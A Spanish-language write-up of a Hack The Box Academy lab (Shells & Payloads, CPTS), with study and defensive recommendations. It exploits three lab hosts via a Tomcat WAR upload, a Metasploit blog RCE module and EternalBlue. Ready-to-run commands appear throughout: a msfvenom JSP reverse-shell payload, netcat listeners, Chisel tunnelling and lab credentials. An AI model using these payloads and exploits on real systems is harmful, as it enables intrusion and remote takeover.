# Shells & Payloads — HTB Academy (CPTS)

**Plataforma:** Hack The Box Academy
**Módulo:** Shells & Payloads
**Tipo:** Skills Assessment (1 foothold + 3 máquinas objetivo)
**Certificación:** CPTS (Certified Penetration Testing Specialist)
**Fecha de resolución:** 2026
**Idioma:** Español — [🇬🇧 English version](./Shells_and_Payloads_Writeup_EN.md)

---

## Contexto del ejercicio

El equipo "CAT5" ha conseguido un **punto de apoyo (foothold)** en la red interna de Inlanefreight. Nuestra tarea es examinar el reconocimiento ya hecho, validar la información, e identificar qué exploits, payloads y shells usar para tomar el control de tres objetivos internos. El acceso al foothold es por **RDP**, y desde ahí (o mediante *pivoting*) alcanzamos el resto de la red.

**Objetivos del laboratorio:**
- Demostrar cómo explotar y obtener una shell interactiva desde un host/servidor **Windows**.
- Demostrar cómo explotar y obtener una shell interactiva desde un host/servidor **Linux**.
- Demostrar cómo explotar y obtener una shell interactiva desde una **aplicación web**.
- Identificar el **entorno de shell** al que se tiene acceso como usuario en cada víctima.

**Credenciales y datos iniciales proporcionados:**

| Host | Dirección | Notas |
|------|-----------|-------|
| Foothold | *(la que asigne HTB al lanzar el lab)* | RDP con `htb-student` / `HTB_@cademy_stdnt!` |
| Host-01 | `172.16.1.11:8080` | — |
| Host-02 | `blog.inlanefreight.local` | — |
| Host-03 | `172.16.1.13` | — |

![](Imagenes/01-topologia-laboratorio.png)

## Índice
1. [Preparación del foothold](#1-preparación-del-foothold)
2. [Host-01 — Windows Server / Apache Tomcat (subida de WAR)](#2-host-01--windows-server--apache-tomcat-subida-de-war)
3. [Host-02 — Linux / aplicación web vulnerable (RCE autenticado)](#3-host-02--linux--aplicación-web-vulnerable-rce-autenticado)
4. [Host-03 — Windows Server / EternalBlue (MS17-010)](#4-host-03--windows-server--eternalblue-ms17-010)
5. [Lección aprendida](#5-lección-aprendida)
6. [Glosario de herramientas y comandos](#6-glosario-de-herramientas-y-comandos)

---

## 1. Preparación del foothold

Antes de tocar cualquier objetivo interno, comprobamos que el foothold responde:

```bash
ping -c 1 10.129.204.126
```

> 🛠️ **`ping`** — comprueba, mediante paquetes ICMP, si un host está activo y responde en la red. El parámetro `-c 1` limita el envío a un solo paquete (en Linux, por defecto `ping` no para hasta que se interrumpe manualmente).

![](Imagenes/02-ping-foothold.png)

Con el host confirmado, nos conectamos por **RDP** (Remote Desktop Protocol) con las credenciales proporcionadas:

```bash
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.204.126
```

> 🛠️ **`xfreerdp`** — cliente de RDP para Linux (parte del proyecto FreeRDP). `/u:` usuario, `/p:` contraseña, `/v:` dirección del servidor RDP. Se usa aquí porque el foothold es una máquina con **escritorio gráfico** (Parrot OS) accesible solo por RDP, no por SSH (todavía).

![](Imagenes/03-xfreerdp-htb-student.png)

Accedemos al escritorio de Parrot OS del foothold (usuario `htb-student`), con un fichero interesante ya visible en el escritorio (`access-creds.txt`, bloqueado — más adelante veremos su contenido):

![](Imagenes/04-escritorio-parrot-foothold.png)

### 1.1 Enumeración de privilegios locales

Abrimos una terminal y revisamos el propio home del usuario:

```bash
ls -la
```

> 🛠️ **`ls -la`** — lista el contenido de un directorio incluyendo ficheros ocultos (`-a`) y en formato detallado (`-l`, con permisos, propietario y tamaño). El primer paso lógico en cualquier host nuevo: ver qué hay disponible.

![](Imagenes/05-ls-la-home-htb-student.png)

Comprobamos qué comandos podemos ejecutar con privilegios elevados:

```bash
sudo -l
```

> 🛠️ **`sudo -l`** — lista los comandos que el usuario actual puede ejecutar con `sudo` según el fichero `/etc/sudoers`. Es uno de los primeros chequeos de escalada de privilegios en cualquier máquina Linux.

![](Imagenes/06-sudo-l-nopasswd-all.png)

El resultado muestra `(ALL : ALL) ALL` — el usuario `htb-student` puede ejecutar **cualquier comando como cualquier usuario**, sin restricciones. Elevamos a root directamente:

```bash
sudo su
```

> 🛠️ **`sudo su`** — ejecuta `su` (switch user, sin especificar usuario = root) con privilegios de `sudo`. Al combinarse con un `sudoers` sin restricciones, esto da una shell de root inmediata.

![](Imagenes/07-sudo-su-root.png)

### 1.2 Habilitar SSH para trabajar más cómodamente

Trabajar desde un escritorio remoto por RDP es más lento que usar una terminal directa. Habilitamos/confirmamos el servicio SSH:

```bash
nano /etc/ssh/sshd_config
```

> 🛠️ **`nano`** — editor de texto en terminal, sencillo de usar. Lo empleamos para revisar/editar la configuración del **servidor SSH** (`sshd`), en concreto la directiva `Port 22` para confirmar en qué puerto escuchará.

![](Imagenes/08-nano-sshd-config.png)

Reiniciamos el servicio para aplicar cambios y confirmamos que está activo:

```bash
systemctl restart ssh
systemctl status ssh
```

> 🛠️ **`systemctl`** — herramienta de administración de servicios (`systemd`) en distribuciones Linux modernas. `restart` reinicia el servicio (necesario tras cualquier cambio de configuración); `status` muestra si está activo, su PID, logs recientes, etc.

![](Imagenes/09-systemctl-restart-status-ssh.png)

Desde nuestra máquina atacante (Kali), nos conectamos ya por SSH, mucho más ágil que el RDP:

```bash
ssh htb-student@10.129.204.126
```

> 🛠️ **`ssh`** — cliente de shell segura; establece una conexión cifrada a un servidor SSH. A partir de aquí trabajamos con una terminal normal en vez del escritorio remoto, lo cual agiliza mucho copiar/pegar comandos largos y gestionar varias sesiones.

![](Imagenes/10-ssh-reconexion-atacante.png)

### 1.3 Mapeo de la red interna

Como root, revisamos el fichero de resolución de nombres local, que HTB suele rellenar con pistas del entorno:

```bash
cat /etc/hosts
```

> 🛠️ **`cat`** — muestra el contenido de un fichero de texto por pantalla. `/etc/hosts` es el fichero de resolución de nombres local en Linux: aquí HTB Academy suele "filtrar" los nombres DNS internos de las máquinas del laboratorio antes incluso de escanear nada.

![](Imagenes/11-cat-etc-hosts-red-interna.png)

Esto nos revela tres hosts internos: `status.inlanefreight.local` (172.16.1.11), `blog.inlanefreight.local` (172.16.1.12) y `lab.inlanefreight.local` (10.129.201.134) — coinciden con los rangos de Host-01 y Host-02 que nos había dado el enunciado.

### 1.4 Preparación de herramientas — Chisel

Vamos a necesitar acceder a puertos internos (como el 8080 de Host-01) que no son directamente alcanzables desde nuestra máquina atacante. Para ello preparamos **Chisel**, una herramienta de *tunneling*.

> 🛠️ **Chisel** — herramienta escrita en Go que crea túneles TCP/UDP sobre HTTP (con soporte SSH por debajo). Permite exponer un puerto que solo es accesible desde una máquina intermedia (aquí, el foothold) hacia nuestra máquina atacante, o viceversa. Es la navaja suiza del *pivoting* en un pentest con acceso limitado a redes segmentadas.

Descargamos los binarios de Chisel (Linux y Windows) desde un servidor HTTP que hemos levantado en nuestra máquina atacante:

```bash
wget http://10.10.15.95:8080/chisel
wget http://10.10.15.95:8080/chisel.exe
```

> 🛠️ **`wget`** — descarga ficheros por HTTP/HTTPS/FTP desde la terminal. Aquí se usa para transferir el binario de Chisel desde nuestro propio servidor (`python3 -m http.server 8080` en la máquina atacante) hasta el foothold, sin necesidad de disco compartido ni SCP.

![](Imagenes/12-wget-chisel-http-server.png)

Damos permisos de ejecución al binario descargado:

```bash
chmod +x chisel
```

> 🛠️ **`chmod +x`** — añade el permiso de ejecución a un fichero. Necesario porque un binario descargado no tiene por defecto permiso de ejecución en Linux.

![](Imagenes/13-chmod-x-chisel.png)

### 1.5 Credenciales encontradas en el escritorio

De vuelta al escritorio, abrimos el fichero visto al principio (`access-creds.txt`):

![](Imagenes/14-access-creds-txt-desktop.png)

```
to manage the blog:
- admin / admin123!@#  ( keep it simple for the new admins )

to manage Tomcat on apache
- tomcat / Tomcatadm

Change the passwords soon..
```

> 💡 Dos pares de credenciales muy valiosos para más adelante: `admin:admin123!@#` para el blog (Host-02) y `tomcat:Tomcatadm` para el gestor de Tomcat (Host-01). El propio mensaje ("cambien las contraseñas pronto") es una pista de que estas credenciales llevan tiempo sin rotarse — un problema real y frecuente en entornos corporativos.

---

## 2. Host-01 — Windows Server / Apache Tomcat (subida de WAR)

### Preguntas oficiales del Skills Assessment

| # | Pregunta | Respuesta |
|:-:|----------|-----------|
| 1 | *What is the hostname of Host-1? (Format: all lower case)* | ✅ **`shells-winsvr`** — confirmado en el escaneo de versión de nmap (ver §2.1) |
| 2 | *Exploit the target and gain a shell session. Submit the name of the folder located in `C:\Shares\` (Format: all lower case)* | ⚠️ No capturado — la sesión obtenida en Tomcat no llegó a explorar `C:\Shares\` en las capturas disponibles. Con la shell ya conseguida (§2.3), el siguiente paso sería `dir C:\Shares\` para listarlo |

### 2.1 Reconocimiento

Escaneo completo de puertos TCP contra el objetivo interno:

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- 172.16.1.11 -oN AllPorts
```

> 🛠️ **`nmap`** — el escáner de puertos y servicios por excelencia. `-sS` (SYN scan, más sigiloso que un handshake TCP completo), `-Pn` (no descarta el host aunque no responda a ping), `--min-rate 5000` (fuerza un envío rápido de paquetes), `--open` (solo muestra puertos abiertos), `-p-` (los 65535 puertos), `-oN` (guarda la salida en formato normal a fichero).

![](Imagenes/15-host1-nmap-todos-los-puertos.png)

Puertos relevantes: **80** (IIS), **445/139** (SMB), **3389** (RDP), **5985** (WinRM) y, el más interesante, **8080** (http-proxy). Escaneo de versión y scripts:

```bash
nmap -sS -Pn -sCV -T5 -n -p80,135,139,445,515,2105,2107,3387,3389,5985,8080,49664,49665,49666,49667,49671,49672,49673,49676,49677 -oN Ports 172.16.1.11
```

> 🛠️ **`-sCV`** — combina `-sC` (scripts NSE por defecto, útiles para banners, enumeración básica) y `-sV` (detección de versión de servicio). **`-T5`** ajusta la plantilla de temporización al máximo (agresiva), razonable en un laboratorio interno sin IDS real de por medio.

![](Imagenes/16-host1-nmap-version-servicios.png)

El resultado confirma: **hostname `shells-winsvr`**, Windows Server 2019, y **Apache Tomcat 10.0.11 en el puerto 8080**.

> ✅ Esto responde a la primera pregunta del laboratorio: el hostname de Host-1 es **`shells-winsvr`**.

### 2.2 Pivoting con Chisel para alcanzar el puerto 8080

El puerto 8080 de Host-01 solo es alcanzable desde la red interna (donde está el foothold), no directamente desde nuestra máquina atacante. Usamos Chisel para tunelizarlo.

En la máquina **atacante**, levantamos el servidor de Chisel en modo *reverse*:

```bash
chisel server -p 8765 --reverse
```

> 🛠️ **`chisel server --reverse`** — levanta el extremo "servidor" del túnel. El flag `--reverse` permite que sea el **cliente** (el foothold) quien inicie la conexión hacia el servidor y luego el servidor pueda pedirle al cliente que abra túneles hacia redes a las que el cliente sí tiene acceso — ideal cuando el atacante no puede conectar directamente al foothold pero el foothold sí puede salir hacia el atacante.

![](Imagenes/17-chisel-server-reverse-atacante.png)

Desde el **foothold**, lanzamos el cliente de Chisel indicando qué queremos tunelizar:

```bash
./chisel client 10.10.15.95:8765 R:8888:172.16.1.11:8080
```

> 🛠️ **`chisel client ... R:puerto_local:destino:puerto_destino`** — la `R` indica un túnel **remoto** (remote forward): abre el puerto `8888` en la máquina que ejecuta el **servidor** de Chisel (nuestra atacante), y todo lo que llegue ahí se reenvía, a través del túnel, hacia `172.16.1.11:8080` tal y como lo ve el foothold. En la práctica: `http://localhost:8888` en nuestra Kali equivale a `http://172.16.1.11:8080` visto desde dentro de la red de Inlanefreight.

![](Imagenes/18-chisel-client-foothold.png)

### 2.3 Explotación — Tomcat Manager y despliegue de WAR malicioso

Con el túnel activo, abrimos el navegador en nuestra atacante contra `http://localhost:8888` y confirmamos que es Apache Tomcat:

![](Imagenes/19-tomcat-pagina-bienvenida.png)

Accedemos al **Tomcat Manager** (`/manager`) con las credenciales `tomcat:Tomcatadm` encontradas antes en `access-creds.txt`:

> 💡 El **Tomcat Web Application Manager** permite, entre otras cosas, desplegar aplicaciones web empaquetadas como **WAR** directamente desde el navegador. Si un atacante tiene esas credenciales, puede subir código arbitrario que Tomcat ejecutará con los privilegios del servicio — una de las rutas de RCE más clásicas contra Tomcat mal asegurado.

![](Imagenes/20-tomcat-manager-gestor-aplicaciones.png)

Confirmamos con la extensión **Wappalyzer** que la pila tecnológica es Java (coherente con Tomcat):

> 🛠️ **Wappalyzer** — extensión de navegador que identifica tecnologías usadas por un sitio web (lenguajes, frameworks, CMS, servidores) analizando cabeceras, cookies y patrones del código. Útil para confirmar rápidamente el tipo de payload que necesitamos generar.

![](Imagenes/21-wappalyzer-java.png)

Generamos un payload **WAR** malicioso con `msfvenom` — un shell JSP que abre una conexión de vuelta (reverse shell) al ejecutarse:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=456 -f war > shell_test.war
```

> 🛠️ **`msfvenom`** — generador de payloads del framework Metasploit. `-p java/jsp_shell_reverse_tcp` selecciona un payload JSP (JavaServer Pages) que, al ejecutarse dentro de un servidor de aplicaciones Java como Tomcat, abre una shell de sistema y la conecta de vuelta al atacante. `LHOST`/`LPORT` son la IP y puerto donde escuchará nuestro listener. `-f war` empaqueta el resultado en formato WAR (WebApplication aRchive), listo para desplegar en Tomcat.
>
> ⚠️ **Nota sobre el `LHOST` usado:** apuntamos a `172.16.1.5`, la IP **interna** del foothold (no la IP externa de nuestra Kali), porque el servidor Windows objetivo solo tiene conectividad dentro de la red `172.16.1.0/24` — no puede alcanzar directamente a nuestra máquina atacante. El foothold actúa de intermediario también para la conexión de vuelta.

![](Imagenes/22-msfvenom-jsp-shell-reverse-tcp.png)

Ponemos un listener en el foothold, en el mismo puerto que configuramos en el payload:

```bash
nc -lvnp 456
```

> 🛠️ **`nc` (Netcat)** — la "navaja suiza" de redes. `-l` (listen, modo escucha), `-v` (verbose), `-n` (no resolución DNS, más rápido), `-p 456` (puerto en el que escucha). Aquí actúa de receptor para la reverse shell.

![](Imagenes/23-nc-listener-456.png)

Subimos `shell_test.war` desde el formulario "Archivo WAR a desplegar" del Tomcat Manager. Tomcat lo despliega automáticamente como una nueva aplicación (`/shell_test`):

![](Imagenes/24-tomcat-manager-war-desplegado.png)

Al visitar la ruta desplegada (`/shell_test`), el JSP se ejecuta en el servidor y el listener recibe la conexión:

![](Imagenes/25-shell-nt-authority-tomcat.png)

Shell obtenida en Windows, ubicada en `C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>` — el propio directorio de instalación de Tomcat, confirmando que el proceso comprometido es el propio servicio de Tomcat.

---

## 3. Host-02 — Linux / aplicación web vulnerable (RCE autenticado)

### Preguntas oficiales del Skills Assessment

| # | Pregunta | Respuesta |
|:-:|----------|-----------|
| 3 | *What distribution of Linux is running on Host-2? (Format: distro name, all lower case)* | ✅ **`ubuntu`** — confirmado en el escaneo de versión de nmap: `OpenSSH 8.2p1 Ubuntu` y `Apache/2.4.41 (Ubuntu)` (ver §3.1) |
| 4 | *What language is the shell written in that gets uploaded when using the 50064.rb exploit?* | ✅ **PHP** — el módulo pertenece a la categoría `exploit/php/webapps/50064` de Metasploit y sube un fichero `.php` (`data/i/4wZL.php`, visible en el log de §3.3) |
| 5 | *Exploit the blog site and establish a shell session with the target OS. Submit the contents of `/customscripts/flag.txt`* | ⚠️ No capturado — las capturas muestran `ls -la /customscripts/flag.txt` confirmando que el fichero existe, pero no se llegó a capturar su contenido con `cat /customscripts/flag.txt` (ver §3.3) |

### 3.1 Reconocimiento

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- 172.16.1.12 -oN AllPorts
```

![](Imagenes/26-host2-nmap-todos-los-puertos.png)

Solo dos puertos: **22** (SSH) y **80** (HTTP).

```bash
nmap -sS -Pn -sCV -T5 -n -p22,80 -oN Ports 172.16.1.12
```

![](Imagenes/27-host2-nmap-version-servicios.png)

Confirmamos **OpenSSH 8.2p1 (Ubuntu)** y **Apache/2.4.41 (Ubuntu)** — y recordamos que `172.16.1.12` es precisamente `blog.inlanefreight.local`, visto antes en `/etc/hosts`. Todo apunta a que aquí vive **el blog** cuyas credenciales (`admin:admin123!@#`) ya tenemos.

### 3.2 Búsqueda de exploit conocido

En vez de fuzzing manual, HTB Academy nos da una pista directa: buscar un exploit relacionado con el identificador **50064** (el ID del exploit en Exploit-DB).

```bash
searchsploit 50064.rb
```

> 🛠️ **`searchsploit`** — herramienta de línea de comandos para buscar en una copia local de la base de datos de **Exploit-DB**. Muy útil cuando ya se sospecha (por versión de software, por una pista del propio CTF, o por enumeración) qué vulnerabilidad concreta puede aplicar, sin depender de tener conexión a internet.

![](Imagenes/28-searchsploit-50064.png)

Aparece: **"Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)"** — un módulo de Metasploit ya hecho para este CMS de blog concreto.

### 3.3 Cargar el exploit en Metasploit y explotar

Como es un módulo de Metasploit distribuido vía Exploit-DB (no viene integrado por defecto en `msfconsole`), lo copiamos a la carpeta de módulos de usuario de Metasploit:

```bash
mkdir -p ~/.msf4/modules/exploits/php/webapps/
cp /usr/share/exploitdb/exploits/php/webapps/50064.rb ~/.msf4/modules/exploits/php/webapps/
```

> 🛠️ **`~/.msf4/modules/`** — Metasploit, además de sus módulos oficiales, carga automáticamente cualquier módulo colocado en esta ruta de usuario (respetando la misma estructura de carpetas que el framework: `exploits/<lenguaje>/<categoría>/`). Es el mecanismo estándar para añadir exploits de terceros o de Exploit-DB al framework.

![](Imagenes/29-mkdir-cp-modulo-msf4.png)

Arrancamos Metasploit:

```bash
msfconsole
```

![](Imagenes/30-msfconsole-banner.png)

Recargamos todos los módulos para que reconozca el que acabamos de copiar:

```bash
reload_all
```

> 🛠️ **`reload_all`** (comando interno de `msfconsole`) — vuelve a cargar todos los módulos desde todas las rutas configuradas (incluida `~/.msf4/modules/`), sin necesidad de reiniciar Metasploit. Los "WARNING" sobre módulos de `msmail` que no cargan son ruido no relacionado con nuestro exploit y pueden ignorarse.

![](Imagenes/31-reload-all.png)

Buscamos el exploit recién cargado:

```bash
search 50064
```

![](Imagenes/32-search-50064-msfconsole.png)

Lo seleccionamos y revisamos sus opciones:

```bash
use exploit/php/webapps/50064
show options
```

> 🛠️ **`use`** carga un módulo como el módulo activo de la sesión. **`show options`** lista todos los parámetros configurables del módulo (y del payload asociado), indicando cuáles son obligatorios (`yes`) y su valor actual.

![](Imagenes/33-use-0-show-options.png)

Configuramos el objetivo y las credenciales que ya teníamos:

```bash
set RHOSTS 172.16.1.12
set USERNAME admin
set PASSWORD admin123!@#
```

> 🛠️ **`set <PARAMETRO> <VALOR>`** — define el valor de una opción del módulo cargado. `RHOSTS` es el/los host(s) objetivo; `USERNAME`/`PASSWORD` son específicos de este exploit, ya que requiere **autenticación previa** en el blog (de ahí lo de "Authenticated" en el nombre del exploit).

![](Imagenes/34-set-rhosts-username-password.png)

Como el exploit necesita resolver el nombre virtual del sitio (vhost), lo indicamos también:

```bash
set VHOST blog.inlanefreight.local
```

> 🛠️ **`VHOST`** — cabecera `Host:` que el módulo incluirá en sus peticiones HTTP. Necesario cuando el servidor web aloja varios sitios (*virtual hosting*) y decide qué aplicación servir según ese valor, en vez de servir siempre la misma app para cualquier IP.

![](Imagenes/35-set-vhost-blog.png)

Ejecutamos el exploit:

```bash
run
```

> 🛠️ **`run`** (equivalente a `exploit`) — ejecuta el módulo cargado con la configuración actual.

![](Imagenes/36-run-meterpreter-flag-txt.png)

El log muestra el proceso completo: obtiene un token CSRF, inicia sesión como `admin`, sube una shell PHP (`data/i/4wZL.php`) y activa el payload, abriendo una sesión de **Meterpreter**.

> 🛠️ **Meterpreter** — el payload avanzado de Metasploit; no es solo una shell de comandos, sino un entorno interactivo con su propio conjunto de comandos (navegación de ficheros, migración de proceso, captura de pantalla, pivoting, etc.), todo ello en memoria para minimizar el rastro en disco.

Confirmamos el compromiso listando la flag mencionada en el enunciado:

```bash
ls -la /customscripts/flag.txt
```

---

## 4. Host-03 — Windows Server / EternalBlue (MS17-010)

### Preguntas oficiales del Skills Assessment

| # | Pregunta | Respuesta |
|:-:|----------|-----------|
| 6 | *What is the hostname of Host-3?* | ✅ **`SHELLS-WINBLUE`** — confirmado en el escaneo de versión de nmap (ver §4.1) |
| 7 | *Exploit and gain a shell session with Host-3. Then submit the contents of `C:\Users\Administrator\Desktop\Skills-flag.txt`* | ⚠️ No capturado — las capturas disponibles terminan justo al lanzar el exploit (§4.3), antes de la post-explotación necesaria para leer el fichero |

### 4.1 Reconocimiento

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- 172.16.1.13 -oN AllPorts
```

![](Imagenes/37-host3-nmap-todos-los-puertos.png)

Puertos clásicos de Windows con SMB: **80, 135, 139, 445**.

```bash
nmap -sS -Pn -sCV -T5 -n -p135,139,445 -oN Ports 172.16.1.13
```

![](Imagenes/38-host3-nmap-version-servicios-smb.png)

El hostname es **`SHELLS-WINBLUE`** (Windows Server 2016) y el script `smb2-security-mode` avisa de **"Message signing enabled but not required"** — una señal de que la firma SMB no es obligatoria, lo cual es un requisito para que ciertos exploits SMB funcionen sin fricciones.

> 💡 El propio nombre del host, **"WINBLUE"**, es una pista bastante explícita hacia **EternalBlue**, el exploit de la NSA filtrado en 2017 que aprovecha una vulnerabilidad en el protocolo SMBv1 de Windows.

### 4.2 Confirmación de la vulnerabilidad

En vez de asumir, lo confirmamos con el script NSE específico:

```bash
nmap -p 445 --script smb-vuln-ms17-010 172.16.1.13 -Pn
```

> 🛠️ **`smb-vuln-ms17-010`** — script de detección (NSE) de Nmap que comprueba, sin explotar activamente, si un host es vulnerable a **MS17-010 / EternalBlue** (CVE-2017-0143 y relacionados). Es la forma responsable de confirmar la vulnerabilidad antes de lanzar el exploit real.

![](Imagenes/39-nmap-smb-vuln-ms17-010.png)

Resultado: **VULNERABLE** — confirmado con el CVE **CVE-2017-0143**, riesgo **HIGH**.

### 4.3 Explotación con Metasploit

```bash
msfconsole
search ms17-010
```

![](Imagenes/40-msfconsole-search-ms17-010.png)

Aparecen varios módulos relacionados; usamos el más conocido y estable, **`eternalblue`**:

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
```

> 🛠️ **`ms17_010_eternalblue`** — módulo de Metasploit que implementa el exploit EternalBlue completo (a diferencia de `ms17_010_psexec`, que requiere credenciales válidas; EternalBlue **no** las necesita, solo el puerto 445 vulnerable). Por defecto usa el payload `windows/x64/meterpreter/reverse_tcp`.

![](Imagenes/41-use-eternalblue-show-options.png)

Configuramos el objetivo y, de nuevo, el `LHOST` interno del foothold (por el mismo motivo que en Host-01: este servidor Windows solo tiene salida hacia la red interna):

```bash
set RHOSTS 172.16.1.13
set LHOST 172.16.1.5
run
```

![](Imagenes/42-set-rhosts-lhost-run.png)

El exploit corre contra el objetivo confirmado como vulnerable, abriendo una sesión de Meterpreter con privilegios de `NT AUTHORITY\SYSTEM` (comportamiento estándar de EternalBlue al tener éxito, dado que corrompe memoria del kernel para inyectar el payload).

---

## 5. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| Credenciales administrativas guardadas en un fichero de texto plano en el escritorio | Foothold (`access-creds.txt`) | Cualquiera con acceso al escritorio compromete de un vistazo dos servicios distintos |
| Credenciales por defecto/débiles y sin rotar en el gestor de Tomcat | Host-01 (`tomcat:Tomcatadm`) | El Tomcat Manager con credenciales conocidas es una vía directa de RCE mediante despliegue de WAR |
| Puerto de gestión (8080) accesible solo desde la red interna, pero sin control de acceso adicional una vez alcanzado | Host-01 | Cualquier atacante que consiga pivotar (aquí, con Chisel) llega igualmente al panel de administración |
| Aplicación web desactualizada con un CVE/exploit público conocido | Host-02 (blog "Lightweight facebook-styled") | RCE autenticado trivial de reproducir con un módulo de Metasploit ya publicado |
| Reutilización de credenciales del fichero del escritorio para autenticarse en la aplicación web | Host-02 | Una única filtración de credenciales compromete múltiples sistemas |
| SMBv1 habilitado y sin parchear frente a MS17-010 | Host-03 | Ejecución remota de código sin autenticación, con privilegios de SYSTEM — el escenario más crítico posible |

## Recomendaciones defensivas

- No guardar credenciales en texto plano en ficheros del sistema, ni siquiera "temporalmente" — usar un gestor de secretos.
- Cambiar inmediatamente las credenciales por defecto de paneles de administración (Tomcat Manager, CMS, etc.) y rotarlas periódicamente.
- Restringir el acceso a interfaces de gestión (Tomcat Manager, phpMyAdmin, etc.) por IP/VPN, no solo por credenciales.
- Mantener aplicaciones web y CMS actualizados; monitorizar CVEs publicados contra el software usado.
- Deshabilitar SMBv1 por completo en entornos Windows modernos y aplicar los parches de MS17-010 (KB4013389 y relacionados).
- Segmentar la red interna de forma que un único punto de apoyo comprometido no dé acceso directo a todos los servicios críticos.
- Auditar periódicamente qué servicios de gestión están expuestos, incluso dentro de la red interna.

---

## 6. Glosario de herramientas y comandos

Referencia rápida de todo lo usado en este laboratorio, pensada para repasar antes del examen CPTS:

| Herramienta / comando | Para qué sirve |
|------------------------|-----------------|
| `ping` | Comprobar que un host está activo y responde en red (ICMP) |
| `xfreerdp` | Cliente RDP para conectarse a escritorios remotos Windows/Linux con interfaz gráfica |
| `ls -la` | Listar contenido de un directorio, incluidos ficheros ocultos y permisos |
| `sudo -l` | Ver qué comandos puede ejecutar el usuario actual con privilegios elevados |
| `sudo su` | Obtener una shell de root aprovechando privilegios de sudo |
| `nano` | Editor de texto en terminal, útil para modificar ficheros de configuración |
| `systemctl restart/status` | Reiniciar y comprobar el estado de un servicio gestionado por systemd |
| `ssh` | Conectarse de forma cifrada a un servidor por línea de comandos |
| `cat` | Mostrar el contenido de un fichero de texto |
| `wget` | Descargar ficheros por HTTP/HTTPS/FTP desde la terminal |
| `chmod +x` | Dar permisos de ejecución a un fichero/binario |
| **Chisel** | Crear túneles TCP/UDP sobre HTTP para alcanzar redes/puertos no accesibles directamente (pivoting) |
| `nmap` | Escanear puertos, servicios y versiones de un host o red |
| **Wappalyzer** | Extensión de navegador que identifica tecnologías web (lenguaje, framework, servidor) |
| `msfvenom` | Generar payloads (shells, reverse shells) en múltiples formatos para el framework Metasploit |
| `nc` (Netcat) | Abrir listeners o conexiones TCP/UDP manuales; clásico receptor de reverse shells |
| **Tomcat Manager** | Panel web de Apache Tomcat para desplegar aplicaciones (WAR); fuente habitual de RCE si las credenciales son débiles |
| `searchsploit` | Buscar exploits en una copia local de la base de datos de Exploit-DB |
| `msfconsole` | Consola interactiva del framework Metasploit |
| `reload_all` | Recargar todos los módulos de Metasploit, incluidos los añadidos manualmente |
| `use` / `show options` / `set` / `run` | Ciclo básico de trabajo en Metasploit: cargar un módulo, ver sus parámetros, configurarlos y ejecutarlo |
| **Meterpreter** | Payload avanzado de Metasploit con funcionalidades extendidas más allá de una shell básica |
| `smb-vuln-ms17-010` (script NSE) | Detectar de forma segura (sin explotar) si un host es vulnerable a EternalBlue |
| **EternalBlue (MS17-010)** | Exploit contra una vulnerabilidad crítica de SMBv1 en Windows, con RCE sin autenticación |

---

*Apuntes de CPTS por [Arabot](https://github.com/Caan31) · HTB Academy · Módulo Shells & Payloads · 2026*
